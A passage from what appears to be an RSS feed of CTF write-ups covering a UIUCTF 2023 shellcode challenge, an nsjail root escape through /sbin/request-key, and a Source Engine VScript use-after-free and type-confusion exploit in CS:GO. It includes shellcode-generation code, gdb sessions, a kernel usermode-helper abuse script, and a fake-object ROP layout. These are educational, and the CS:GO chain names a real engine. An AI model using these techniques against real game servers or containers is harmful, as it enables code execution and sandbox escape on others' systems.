+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(b64e(asm(shellcraft&lt;span style="color:#f92672">.&lt;/span>cat(&lt;span style="color:#e6db74">&amp;#39;/mnt/flag&amp;#39;&lt;/span>))&lt;span style="color:#f92672">.&lt;/span>rjust(&lt;span style="color:#ae81ff">0x100&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x90&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)))
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Save the output to &lt;code>/home/user/arg&lt;/code>. Now attach the &lt;code>gdb&lt;/code> to the spawner again and find where our shellcode is:&lt;/p>
+&lt;pre tabindex="0">&lt;code>(gdb) file virophage
+Reading symbols from virophage...
+(gdb) r $(base64 -d /home/user/arg)
+Starting program: /home/user/virophage $(base64 -d /home/user/arg)
+Please enter a number in hex: 0x0
+You entered: 0x00000000
+execve...
+process 123 is executing new program: /tmp/virus
+Program received signal SIGSEGV, Segmentation fault.
+0x00000000 in ?? ()
+(gdb) find $esp, +0x200, (int)0x90909090
+0xffffde22
+0xffffde23
+0xffffde24
+0xffffde25
+0xffffde26
+0xffffde27
+0xffffde28
+0xffffde29
+0xffffde2a
+0xffffde2b
+0xffffde2c
+0xffffde2d
+0xffffde2e
+0xffffde2f
+0xffffde30
+...
+&lt;/code>&lt;/pre>&lt;p>I choose &lt;code>0xffffde30&lt;/code> as the entry point to avoid any alignment problems.
+Now we go to the server, write the encoded shellcode to &lt;code>/home/user/arg&lt;/code> and run the spawner:&lt;/p>
+&lt;pre tabindex="0">&lt;code>uiuctf-2023:~$ ./virophage $(base64 -d /home/user/arg)
+Please enter a number in hex: 0xffffde30
+You entered: 0xFFFFDE30
+execve...
+uiuctf{windows_defender_wont_catch_this_bc238ba4}
+Segmentation fault
+&lt;/code>&lt;/pre>&lt;h2 id="am-i-not-root">Am I not root?&lt;/h2>
+&lt;blockquote>
+&lt;p>Ever wondered why nsjail prints a giant warning when it&amp;rsquo;s run as root? Well, now you know ;)&lt;/p>
+&lt;/blockquote>
+&lt;p>Hint:&lt;/p>
+&lt;blockquote>
+&lt;p>I disabled coredumps and modules. What else are there?&lt;/p>
+&lt;/blockquote>
+&lt;p>The first thing that came to my mind was loading a kernel module, but it is disabled.
+Then I remember that &lt;code>/sbin/modprobe&lt;/code> will be called by the kernel if I execute a file with unknown magic bytes.
+But since kernel module loading is disabled, we cannot use it too. What else we can use to make the kernel execute our code?&lt;/p>
+&lt;p>The kernel will sometimes call user mode helper like &lt;code>/sbin/modprobe&lt;/code> using &lt;code>call_usermodehelper_setup&lt;/code> and &lt;code>call_usermodehelper_exec&lt;/code>.
+&lt;code>call_usermodehelper&lt;/code> will call both functions.&lt;/p>
+&lt;p>Finding references to those functions, I found an interesting call in
+&lt;a class="link" href="https://elixir.bootlin.com/linux/v6.1.32/source/security/keys/request_key.c#L196" target="_blank" rel="noopener"
+>&lt;code>security/keys/request_key.c&lt;/code>&lt;/a>,
+which will calls &lt;code>/sbin/request-key&lt;/code>. Searching for it, I came to &lt;a class="link" href="https://www.kernel.org/doc/html/v4.15/security/keys/request-key.html" target="_blank" rel="noopener"
+>the documentation of Key Request Service&lt;/a>.
+According to the documentation, we can make the kernel execute &lt;code>/sbin/request-key&lt;/code> by calling &lt;code>SYS_request_key&lt;/code> syscall.&lt;/p>
+&lt;p>Since we are root, we can create &lt;code>/sbin/request-key&lt;/code> file. I populated it with the following script:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/bin/sh
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>cat /mnt/flag &amp;gt; /tmp/flag
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We also have to run &lt;code>chmod +x /sbin/request-key&lt;/code> to make it executable.&lt;/p>
+&lt;p>After that, I call &lt;code>SYS_request_key&lt;/code> using the example in
+&lt;a class="link" href="https://man7.org/linux/man-pages/man2/request_key.2.html" target="_blank" rel="noopener"
+>the &lt;code>man&lt;/code> page of &lt;code>SYS_request_key&lt;/code>&lt;/a>, and the flag were written to &lt;code>/tmp/flag&lt;/code>.&lt;/p>
+&lt;pre tabindex="0">&lt;code>uiuctf-2023:/home/user# ./a.out user mtk:key1 &amp;#34;Payload data&amp;#34;
+request_key: Required key not available
+uiuctf-2023:/home/user# cat /tmp/flag
+uiuctf{need_more_isolations_for_root_5a4bb464}
+&lt;/code>&lt;/pre></description></item><item><title>ALLES! CTF 2021 - 🔥 Counter Strike: Squirrel Offensive</title><link>https://nyancat0131.moe/post/ctf-writeups/alles-ctf/2021/csgo/</link><pubDate>Mon, 06 Sep 2021 07:30:12 +0000</pubDate><guid>https://nyancat0131.moe/post/ctf-writeups/alles-ctf/2021/csgo/</guid><description>&lt;p>This challenge involves an old version of CS:GO VScript, which is vulnerable to &lt;a class="link" href="https://github.com/albertodemichelis/squirrel/issues/220" target="_blank" rel="noopener"
+>a UAF bug and a type confusion bug&lt;/a>.&lt;/p>
+&lt;p>Resources on VScript can be found &lt;a class="link" href="https://developer.valvesoftware.com/wiki/VScript" target="_blank" rel="noopener"
+>here&lt;/a>.&lt;/p>
+&lt;p>&lt;a class="link" href="https://gist.githubusercontent.com/kungfulon/c50323cf6ae54104e3c65b2b30804cc1/raw/c2f6cf5a5eabea14c40ef152c83c6fff1ba5e894/exp.nut" target="_blank" rel="noopener"
+>Here&lt;/a> is the exploit script.&lt;/p>
+&lt;h2 id="uaf-by-resizing-array-in-sort-compare-function">UAF by resizing array in sort compare function&lt;/h2>
+&lt;p>The sort function of squirrel array is &lt;code>array_sort&lt;/code> in &lt;code>sqbaselib.cpp&lt;/code>, which will call &lt;code>_qsort&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// v: VM, o: array object, func: compare func
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>_qsort(v, o, &lt;span style="color:#ae81ff">0&lt;/span>, _array(o)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Size()&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>, func);
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The &lt;code>r&lt;/code> index passed into &lt;code>_qsort&lt;/code> is fixed at the beginning, so by abusing &lt;code>array.resize&lt;/code> in compare function, we can retrieve dangling reference to freed objects through compare function parameters.&lt;/p>
+&lt;p>By freeing a string then overlap it with an array, the &lt;code>_len&lt;/code> field of the freed &lt;code>SQString&lt;/code> object will be overwritten by the &lt;code>_sharedstate&lt;/code> field of the newly created &lt;code>SQArray&lt;/code>. It&amp;rsquo;s a pointer so the value will be very large, and we can use the dangling string to do arbitrary reading over a large heap space after it.&lt;/p>
+&lt;h2 id="type-confusion-in-regexp-functions">Type confusion in regexp functions&lt;/h2>
+&lt;p>&lt;code>_regexp_*&lt;/code> functions in &lt;code>sqstdstring.cpp&lt;/code> retrieve &lt;code>SQRex&lt;/code> object from the current object using &lt;code>SETUP_REX&lt;/code> macro:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define SETUP_REX(v) \
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> SQRex *self = NULL; \
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> sq_getinstanceup(v,1,(SQUserPointer *)&amp;amp;self,0);
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The &lt;code>typetag&lt;/code> parameter is &lt;code>0&lt;/code>, means that it will not check for type mismatch. So we can call &lt;code>_regexp_*&lt;/code> functions using any &lt;code>instance&lt;/code> object (examples: self-defined classes, external library classes like CS:GO script classes).&lt;/p>
+&lt;h2 id="addresses-leaking">Addresses leaking&lt;/h2>
+&lt;p>As we have a long string by using UAF bug above, we can just spray a lot of &lt;code>CScriptKeyValues&lt;/code> and find one of them using last 2 bytes of &lt;code>SQInstance::vtable&lt;/code> as they will not be affected by Windows ASLR, then use confusion to watch for changes to &lt;code>_userpointer&lt;/code> field. But there are other &lt;code>instance&lt;/code> objects too, and we have no way to be sure that it&amp;rsquo;s a &lt;code>CScriptKeyValues&lt;/code> object.&lt;/p>
+&lt;p>Fortunately, the &lt;code>tostring&lt;/code> method will return the type name and the address in memory of any object. For number and string it will just return the value. But we overlapped the freed string with an array, so we can get address of it by calling &lt;code>tostring&lt;/code> on the array. We can keep allocate new &lt;code>CScriptKeyValues&lt;/code> object until we get one that lies after our long string and in the range that we can read its data. I won&amp;rsquo;t go into detail of Source Engine heap in this writeup, but most of the time we will get a satisfied object without triggering Squirrel timeout watchdog.&lt;/p>
+&lt;p>By reading the &lt;code>CScriptKeyValues&lt;/code> object, we can get these values:&lt;/p>
+&lt;ul>
+&lt;li>Pointer to &lt;code>SQInstance::vtable&lt;/code>, which can be used to calculate &lt;code>vscript.dll&lt;/code> base address for ROP gadgets&lt;/li>
+&lt;li>Pointer to &lt;code>_userpointer&lt;/code> of that object&lt;/li>
+&lt;/ul>
+&lt;h2 id="path-of-exploitation">Path of exploitation&lt;/h2>
+&lt;p>My approach is to use a CS:GO script class, &lt;code>CScriptKeyValues&lt;/code>. Squirrel will panic if you attempt to modify the prototype after 1 instance of a class has been created. Since in map loading, there&amp;rsquo;re no instance of this class would be created, we can modify its prototype:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">CScriptKeyValues&lt;/span>.&lt;span style="color:#a6e22e">confuse&lt;/span> &lt;span style="color:#f92672">&amp;lt;-&lt;/span> &lt;span style="color:#a6e22e">regexp&lt;/span>.&lt;span style="color:#a6e22e">constructor&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">CScriptKeyValues&lt;/span>.&lt;span style="color:#a6e22e">confuse2&lt;/span> &lt;span style="color:#f92672">&amp;lt;-&lt;/span> &lt;span style="color:#a6e22e">regexp&lt;/span>.&lt;span style="color:#a6e22e">search&lt;/span>;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>When we call any method of a CS:GO script class, &lt;code>CSquirrelVM::TranslateCall&lt;/code> in &lt;code>vsquirrel.cpp&lt;/code> will be called. It will access &lt;code>_userpointer&lt;/code> field of the object to get binding information:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>pContext &lt;span style="color:#f92672">=&lt;/span> (InstanceContext_t &lt;span style="color:#f92672">*&lt;/span>)sa.GetInstanceUp(&lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#ae81ff">0&lt;/span>); &lt;span style="color:#75715e">// _userpointer
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">!&lt;/span>pContext )
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sq_throwerror( hVM, &lt;span style="color:#e6db74">&amp;#34;Accessed null instance&amp;#34;&lt;/span> );
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> SQ_ERROR;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pObject &lt;span style="color:#f92672">=&lt;/span> pContext&lt;span style="color:#f92672">-&amp;gt;&lt;/span>pInstance;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">!&lt;/span>pObject )
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sq_throwerror( hVM, &lt;span style="color:#e6db74">&amp;#34;Accessed null instance&amp;#34;&lt;/span> );
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> SQ_ERROR;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> ( pContext&lt;span style="color:#f92672">-&amp;gt;&lt;/span>pClassDesc&lt;span style="color:#f92672">-&amp;gt;&lt;/span>pHelper )
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pObject &lt;span style="color:#f92672">=&lt;/span> pContext&lt;span style="color:#f92672">-&amp;gt;&lt;/span>pClassDesc&lt;span style="color:#f92672">-&amp;gt;&lt;/span>pHelper&lt;span style="color:#f92672">-&amp;gt;&lt;/span>GetProxied( pObject );
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>_regexp_constructor&lt;/code> will create a new &lt;code>SQRex&lt;/code> class and store it in &lt;code>_userpointer&lt;/code> field. That means we can control &lt;code>pContext&lt;/code>. Below is &lt;code>InstanceContext_t&lt;/code> struct:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">InstanceContext_t&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>pInstance;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ScriptClassDesc_t &lt;span style="color:#f92672">*&lt;/span>pClassDesc;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SQObjectPtr name;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Below is &lt;code>SQRex&lt;/code> struct:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">SQRex&lt;/span>{
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> SQChar &lt;span style="color:#f92672">*&lt;/span>_eol;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> SQChar &lt;span style="color:#f92672">*&lt;/span>_bol;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> SQChar &lt;span style="color:#f92672">*&lt;/span>_p;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SQInteger _first;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SQInteger _op;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SQRexNode &lt;span style="color:#f92672">*&lt;/span>_nodes;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SQInteger _nallocated;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SQInteger _nsize;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SQInteger _nsubexpr;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SQRexMatch &lt;span style="color:#f92672">*&lt;/span>_matches;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SQInteger _currsubexp;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>_jmpbuf;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> SQChar &lt;span style="color:#f92672">**&lt;/span>_error;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>pClassDesc&lt;/code> field overlaps with &lt;code>_bol&lt;/code> field. When we call &lt;code>_regexp_search(str)&lt;/code>, &lt;code>_bol&lt;/code> field will be set to the beginning of &lt;code>str&lt;/code>. So we can craft a fake &lt;code>ScriptClassDesc_t&lt;/code> object using a string. Below is &lt;code>ScriptClassDesc_t&lt;/code> struct:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">ScriptClassDesc_t&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span> m_pszScriptName;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span> m_pszClassname;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span> m_pszDescription;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ScriptClassDesc_t &lt;span style="color:#f92672">*&lt;/span> m_pBaseDesc;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> CUtlVector&lt;span style="color:#f92672">&amp;lt;&lt;/span>ScriptFunctionBinding_t&lt;span style="color:#f92672">&amp;gt;&lt;/span> m_FunctionBindings;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>m_pfnConstruct)();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">void&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>m_pfnDestruct)( &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> IScriptInstanceHelper &lt;span style="color:#f92672">*&lt;/span> pHelper; &lt;span style="color:#75715e">// offset 0x2C
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ScriptClassDesc_t &lt;span style="color:#f92672">*&lt;/span> m_pNextDesc;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Below is &lt;code>IScriptInstanceHelper&lt;/code> interface:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">IScriptInstanceHelper&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">virtual&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>GetProxied( &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>p );
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">virtual&lt;/span> &lt;span style="color:#66d9ef">bool&lt;/span> &lt;span style="color:#a6e22e">ToString&lt;/span>( &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>p, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>pBuf, &lt;span style="color:#66d9ef">int&lt;/span> bufSize );
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">virtual&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#a6e22e">BindOnRead&lt;/span>( HSCRIPT hInstance, &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>pOld, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>pszId );
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can craft a fake &lt;code>IScriptInstanceHelper&lt;/code> object to control the virtual method table.&lt;/p>
+&lt;p>Fortunately, Squirrel string is not null-terminated, so we don&amp;rsquo;t have to worry about null bytes.&lt;/p>
+&lt;p>In conclusion, the fake object will look like this:&lt;/p>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>Offset&lt;/th>
+&lt;th>Content&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>0x0&lt;/td>
+&lt;td>pivot gadget&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&amp;hellip;&lt;/td>
+&lt;td>padding&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>0x2C&lt;/td>
+&lt;td>&lt;code>_userpointer + 0x4&lt;/code> (&lt;code>_bol&lt;/code>)&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;h2 id="conclusion">Conclusion&lt;/h2>
+&lt;p>Thanks ALLES! team for organizing a great CTF with awesome challenges, and allowed late submission of 🔥 challenges.&lt;/p>
+&lt;p>Source Engine is a mature engine with a lot of functions, and use a lot of unsafe memory code. With the fact that any people can host dedicated servers, it&amp;rsquo;s a huge attack surface. It&amp;rsquo;s sad that Valve never bothers fixing security bugs in the engine quickly. I really hoped that they will pick up the pace after secret club&amp;rsquo;s callout, but seems like they will never do that.&lt;/p></description></item></channel></rss>
